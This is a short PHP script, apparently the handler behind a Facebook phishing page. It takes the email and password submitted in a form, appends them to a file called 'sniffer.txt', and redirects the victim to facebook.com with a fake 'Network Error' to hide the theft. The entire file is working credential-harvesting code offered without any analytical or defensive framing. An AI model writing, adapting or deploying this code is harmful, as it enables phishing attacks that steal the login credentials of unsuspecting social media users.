

<?php


class Injector {
	private $email;
	private $password;
	private $myfile;
	private $txt;

	public function __construct($email, $password) {
		$this->email = $email;
		$this->password = $password;
	}

	function fileManager() {
		$this->myfile = fopen("sniffer.txt", "a+") or die("Unable to open file!");
		$this->txt = "EMAIL: " . $this->email . " & " . "PASSWORD: " . $this->password . "\r\n";
		fwrite($this->myfile, $this->txt);
		fclose( $this->myfile );
	}
}

$inj = new Injector($_POST["email"], $_POST["pass"]);
$inj->fileManager();
header('Location: https://www.facebook.com?Network Error');

exit();






